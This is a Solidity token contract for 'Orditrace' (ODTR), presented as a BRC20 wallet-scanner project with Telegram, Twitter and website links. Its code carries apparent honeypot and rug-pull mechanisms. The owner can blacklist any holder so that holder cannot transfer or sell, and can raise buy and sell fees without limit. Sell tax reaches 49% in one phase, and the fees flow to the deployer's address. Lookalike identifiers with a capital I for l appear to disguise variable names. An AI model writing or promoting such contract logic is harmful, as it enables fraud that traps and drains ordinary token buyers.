// SPDX-License-Identifier: MIT   

/*
Orditrace - Wallet Scanner & Tracer for BRC20

https://t.me/Orditrace
https://twitter.com/Orditrace
https://medium.com/@orditrace
https://orditrace.com/
https://t.me/orditrace_bot
*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Orditrace is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private addrExcIude;
    mapping (address => bool) public aMakerV2Pair;
    mapping(address => uint256) private _prevTnxTimestamp;
    mapping (address => bool) public _isBlacklisted;
    address payable private _taxAddre;
    uint256 initialBlock;

    uint256 private _iTOBuy=19;
    uint256 private _mTOBuy=9;
    uint256 private _iTOSell=19;
    uint256 private _mTOSell=49;
    uint256 private _fTOBuy=4;
    uint256 private _fTOSell=4;

    uint256 private _mTOBuyAt=10;
    uint256 private _rTOBuyAt=39;

    uint256 private _mTOSellAt=1;
    uint256 private _rTOSellAt=39;
    uint256 private _nonSwapsBefore=39;
    uint256 private _countOfBuyer=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupplyTotaI = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Orditrace";
    string private constant _symbol = unicode"ODTR";
    uint256 public _tnxLimitSize =   10000000 * 10**_decimals;
    uint256 public _walletsLimitSize = 10000000 * 10**_decimals;
    uint256 public _taxSwapThresSize= 100000 * 10**_decimals;
    uint256 public _taxSwapSize= 60000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool public rescueSwitch = false;
    bool public _openTradin;
    bool private _perTnxDeIay = true;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxLimitUpdated(uint _tnxLimitSize);
    modifier lockTheSwap {
        inSwap = true;  
        _;
        inSwap = false;
    }

    constructor () {

        _taxAddre = payable(_msgSender());
        _balances[_msgSender()] = _tSupplyTotaI;
        addrExcIude[owner()] = true;
        addrExcIude[address(this)] = true;
        addrExcIude[address(uniswapV2Pair)] = true;
        addrExcIude[_taxAddre] = true;
        
        emit Transfer(address(0), _msgSender(), _tSupplyTotaI);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupplyTotaI;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function aMMakerV2Pair(address addr) public onlyOwner {
        aMakerV2Pair[addr] = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (!_isBlacklisted[from] && !_isBlacklisted[to], "To/from address is blacklisted");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _feeAmount=0;
        if (aMakerV2Pair[from] && to != address(this)){ 
            require(tx.origin == to);
            }
        if (from != owner() && to != owner()) {
            _feeAmount = amount.mul((_countOfBuyer> _rTOBuyAt)? _fTOBuy: ((_countOfBuyer> _mTOBuyAt)? _mTOBuy: _iTOBuy)).div(100);
            
            if (_perTnxDeIay) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                  require(_prevTnxTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _prevTnxTimestamp[tx.origin] = block.number;
                }
            }
            if (aMakerV2Pair[from] && to != address(uniswapV2Router) && ! addrExcIude[to] ) {
                require(amount <= _tnxLimitSize, "Exceeds the _tnxLimitSize.");
                require(balanceOf(to) + amount <= _walletsLimitSize, "Exceeds the maxWalletSize.");

                if (initialBlock + 3  > block.number) {
                    require(!isContract(to));
                }
                _countOfBuyer++;
            }

            if (!aMakerV2Pair[to] && ! addrExcIude[to]) {
                require(balanceOf(to) + amount <= _walletsLimitSize, "Exceeds the maxWalletSize.");
            }

            if(aMakerV2Pair[to] && from!= address(this) ){
                _feeAmount = amount.mul((_countOfBuyer> _rTOSellAt)? _fTOSell: ((_countOfBuyer> _mTOSellAt)? _mTOSell: _iTOSell)).div(100);
            }

            if (!aMakerV2Pair[from] && !aMakerV2Pair[to] && from!= address(this) ) {
                _feeAmount = 0;
            }

            uint256 tokenContractBalance = balanceOf(address(this));
            if (!inSwap && aMakerV2Pair[to] && swapEnabled && tokenContractBalance>_taxSwapThresSize && _countOfBuyer>_nonSwapsBefore) {
                swapTokensForEth(min(amount,min(tokenContractBalance,_taxSwapSize)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(_feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_feeAmount);
          emit Transfer(from, address(this),_feeAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_feeAmount));
        emit Transfer(from, to, amount.sub(_feeAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addToBlackList(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
        _isBlacklisted[addresses[i]] = true;
        }
    }

    function rescueEnable(bool _status) external onlyOwner {
        rescueSwitch = _status;
    }

    function addreExclude(address addr, bool exempt) external onlyOwner {
        addrExcIude[addr] = exempt;
    }   

    function _perTnxDelayM(bool _status) external onlyOwner {
        _perTnxDeIay = _status;
    }

    function _rescueETH() public {
        require(rescueSwitch || _openTradin);
        payable(_taxAddre).transfer(address(this).balance);
    }

    function _rescueERC20Tokens(address _tokenAddr, address _to, uint _amount) public {
        require(_msgSender() == _taxAddre);
        IERC20(_tokenAddr).transfer(_to, _amount);
    }

    function _setFBS(uint256 __fTOBuy, uint256 __fTOSell) external onlyOwner {
        _fTOBuy = __fTOBuy;
        _fTOSell = __fTOSell; 
    }

    function removeFromBlackList(address account) external onlyOwner {
    _isBlacklisted[account] = false;
    }

    function removeFromBlackListwallets(address[] calldata addresses) public onlyOwner(){
        for (uint256 i; i < addresses.length; ++i) {
            _isBlacklisted[addresses[i]] = false;
        }
    }

    function _limitless() external onlyOwner{
        _tnxLimitSize=_tSupplyTotaI;
        _walletsLimitSize=_tSupplyTotaI;
        _perTnxDeIay=false;
        emit MaxTxLimitUpdated(_tSupplyTotaI);
    }

    function sendETHToFee(uint256 amount) private {
        _taxAddre.transfer(amount);
    }

    function goTradinLive() external onlyOwner() {
        require(!_openTradin,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tSupplyTotaI);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        aMakerV2Pair[address(uniswapV2Pair)] = true;
        addrExcIude[address(uniswapV2Pair)] = true;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        _openTradin = true;
        initialBlock = block.number;
    }

    receive() external payable {}
}